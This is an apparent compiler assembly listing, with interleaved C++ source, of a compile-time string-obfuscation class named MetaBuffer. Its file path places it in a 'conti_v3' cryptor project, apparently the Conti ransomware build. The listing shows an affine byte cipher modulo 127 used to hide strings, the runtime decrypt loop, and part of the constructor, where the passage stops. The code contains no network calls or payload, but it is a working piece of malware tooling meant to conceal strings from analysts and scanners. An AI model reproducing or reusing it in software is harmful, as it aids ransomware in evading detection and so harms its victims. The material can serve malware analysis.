?decrypt@?$MetaBuffer@$0EJ@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<73,33,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0EJ@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?encrypt@?$MetaBuffer@$0EJ@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@@std@@@@AEBAEE@Z PROC ; MetaBuffer<73,33,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31> >::encrypt, COMDAT

; 74   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 75   :         return (A * byte + B) % 127;

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	6b c0 49	 imul	 eax, eax, 73		; 00000049H
  0002d	83 c0 21	 add	 eax, 33			; 00000021H
  00030	99		 cdq
  00031	b9 7f 00 00 00	 mov	 ecx, 127		; 0000007fH
  00036	f7 f9		 idiv	 ecx
  00038	8b c2		 mov	 eax, edx

; 76   :     }

  0003a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00041	5f		 pop	 rdi
  00042	5d		 pop	 rbp
  00043	c3		 ret	 0
?encrypt@?$MetaBuffer@$0EJ@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<73,33,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31> >::encrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0EJ@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
i$1 = 8
this$ = 256
?decrypt@?$MetaBuffer@$0EJ@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<73,33,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31> >::decrypt, COMDAT

; 62   :     {

$LN7:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 63   :         if (!isDecrypted())

  0001f	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00026	e8 00 00 00 00	 call	 ?isDecrypted@?$MetaBuffer@$0EJ@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@@std@@@@QEBA_NXZ ; MetaBuffer<73,33,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31> >::isDecrypted
  0002b	0f b6 c0	 movzx	 eax, al
  0002e	85 c0		 test	 eax, eax
  00030	75 53		 jne	 SHORT $LN5@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00032	48 c7 45 08 00
	00 00 00	 mov	 QWORD PTR i$1[rbp], 0
  0003a	eb 0b		 jmp	 SHORT $LN4@decrypt
$LN2@decrypt:
  0003c	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00040	48 ff c0	 inc	 rax
  00043	48 89 45 08	 mov	 QWORD PTR i$1[rbp], rax
$LN4@decrypt:
  00047	48 83 7d 08 20	 cmp	 QWORD PTR i$1[rbp], 32	; 00000020H
  0004c	73 37		 jae	 SHORT $LN3@decrypt

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0004e	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00052	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00059	48 03 c8	 add	 rcx, rax
  0005c	48 8b c1	 mov	 rax, rcx
  0005f	0f b6 50 01	 movzx	 edx, BYTE PTR [rax+1]
  00063	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0006a	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0EJ@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@@std@@@@AEBAEE@Z ; MetaBuffer<73,33,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31> >::decrypt
  0006f	48 8b 4d 08	 mov	 rcx, QWORD PTR i$1[rbp]
  00073	48 8b 95 00 01
	00 00		 mov	 rdx, QWORD PTR this$[rbp]
  0007a	48 03 d1	 add	 rdx, rcx
  0007d	48 8b ca	 mov	 rcx, rdx
  00080	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00083	eb b7		 jmp	 SHORT $LN2@decrypt
$LN3@decrypt:
$LN5@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;

  00085	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0008c	48 ff c0	 inc	 rax

; 70   :     }

  0008f	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00096	5f		 pop	 rdi
  00097	5d		 pop	 rbp
  00098	c3		 ret	 0
?decrypt@?$MetaBuffer@$0EJ@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<73,33,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0EJ@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 224
?isDecrypted@?$MetaBuffer@$0EJ@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@@std@@@@QEBA_NXZ PROC ; MetaBuffer<73,33,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31> >::isDecrypted, COMDAT

; 57   :     {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 58   :         return m_isDecrypted;

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	0f b6 00	 movzx	 eax, BYTE PTR [rax]

; 59   :     }

  00029	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00030	5f		 pop	 rdi
  00031	5d		 pop	 rbp
  00032	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0EJ@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<73,33,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0EJ@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
tv322 = 192
this$ = 240
data$ = 248
??0?$MetaBuffer@$0EJ@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<73,33,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31> >::MetaBuffer<73,33,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31> >, COMDAT

; 50   :     constexpr __forceinline MetaBuffer(const unsigned char* data)

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec f8 00
	00 00		 sub	 rsp, 248		; 000000f8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00024	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0002b	c6 00 00	 mov	 BYTE PTR [rax], 0

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  0002e	b8 01 00 00 00	 mov	 eax, 1
  00033	48 6b c0 00	 imul	 rax, rax, 0
  00037	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0003e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00042	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00049	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EJ@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@@std@@@@AEBAEE@Z ; MetaBuffer<73,33,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31> >::encrypt
  0004e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00055	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00058	b8 01 00 00 00	 mov	 eax, 1
  0005d	48 6b c0 01	 imul	 rax, rax, 1
  00061	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00068	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0006c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00073	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EJ@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@@std@@@@AEBAEE@Z ; MetaBuffer<73,33,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31> >::encrypt
  00078	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0007f	88 41 02	 mov	 BYTE PTR [rcx+2], al
  00082	b8 01 00 00 00	 mov	 eax, 1
  00087	48 6b c0 02	 imul	 rax, rax, 2
  0008b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00092	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00096	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0009d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EJ@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@@std@@@@AEBAEE@Z ; MetaBuffer<73,33,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31> >::encrypt
  000a2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000a9	88 41 03	 mov	 BYTE PTR [rcx+3], al
  000ac	b8 01 00 00 00	 mov	 eax, 1
  000b1	48 6b c0 03	 imul	 rax, rax, 3
  000b5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000bc	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000c0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000c7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EJ@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@@std@@@@AEBAEE@Z ; MetaBuffer<73,33,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31> >::encrypt
  000cc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000d3	88 41 04	 mov	 BYTE PTR [rcx+4], al
  000d6	b8 01 00 00 00	 mov	 eax, 1
  000db	48 6b c0 04	 imul	 rax, rax, 4
  000df	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000e6	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000ea	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000f1	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EJ@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@@std@@@@AEBAEE@Z ; MetaBuffer<73,33,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31> >::encrypt
  000f6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000fd	88 41 05	 mov	 BYTE PTR [rcx+5], al
  00100	b8 01 00 00 00	 mov	 eax, 1
  00105	48 6b c0 05	 imul	 rax, rax, 5
  00109	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00110	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00114	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0011b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EJ@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@@std@@@@AEBAEE@Z ; MetaBuffer<73,33,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31> >::encrypt
  00120	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00127	88 41 06	 mov	 BYTE PTR [rcx+6], al
  0012a	b8 01 00 00 00	 mov	 eax, 1
  0012f	48 6b c0 06	 imul	 rax, rax, 6
  00133	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0013a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0013e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00145	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EJ@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@@std@@@@AEBAEE@Z ; MetaBuffer<73,33,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31> >::encrypt
  0014a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00151	88 41 07	 mov	 BYTE PTR [rcx+7], al
  00154	b8 01 00 00 00	 mov	 eax, 1
  00159	48 6b c0 07	 imul	 rax, rax, 7
  0015d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00164	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00168	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0016f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EJ@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@@std@@@@AEBAEE@Z ; MetaBuffer<73,33,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31> >::encrypt
  00174	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0017b	88 41 08	 mov	 BYTE PTR [rcx+8], al
  0017e	b8 01 00 00 00	 mov	 eax, 1
  00183	48 6b c0 08	 imul	 rax, rax, 8
  00187	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0018e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00192	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00199	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EJ@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@@std@@@@AEBAEE@Z ; MetaBuffer<73,33,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31> >::encrypt
  0019e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001a5	88 41 09	 mov	 BYTE PTR [rcx+9], al
  001a8	b8 01 00 00 00	 mov	 eax, 1
  001ad	48 6b c0 09	 imul	 rax, rax, 9
  001b1	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  001b8	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001bc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001c3	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EJ@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@@std@@@@AEBAEE@Z ; MetaBuffer<73,33,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31> >::encrypt
  001c8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001cf	88 41 0a	 mov	 BYTE PTR [rcx+10], al
  001d2	b8 01 00 00 00	 mov	 eax, 1
  001d7	48 6b c0 0a	 imul	 rax, rax, 10
  001db	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  001e2	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001e6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001ed	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EJ@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@@std@@@@AEBAEE@Z ; MetaBuffer<73,33,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31> >::encrypt
  001f2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001f9	88 41 0b	 mov	 BYTE PTR [rcx+11], al
  001fc	b8 01 00 00 00	 mov	 eax, 1
  00201	48 6b c0 0b	 imul	 rax, rax, 11
  00205	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0020c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00210	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00217	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EJ@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@@std@@@@AEBAEE@Z ; MetaBuffer<73,33,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31> >::encrypt
  0021c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00223	88 41 0c	 mov	 BYTE PTR [rcx+12], al
  00226	b8 01 00 00 00	 mov	 eax, 1
  0022b	48 6b c0 0c	 imul	 rax, rax, 12
  0022f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00236	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0023a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00241	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EJ@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@@std@@@@AEBAEE@Z ; MetaBuffer<73,33,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31> >::encrypt
  00246	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0024d	88 41 0d	 mov	 BYTE PTR [rcx+13], al
  00250	b8 01 00 00 00	 mov	 eax, 1
  00255	48 6b c0 0d	 imul	 rax, rax, 13
  00259	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00260	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00264	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
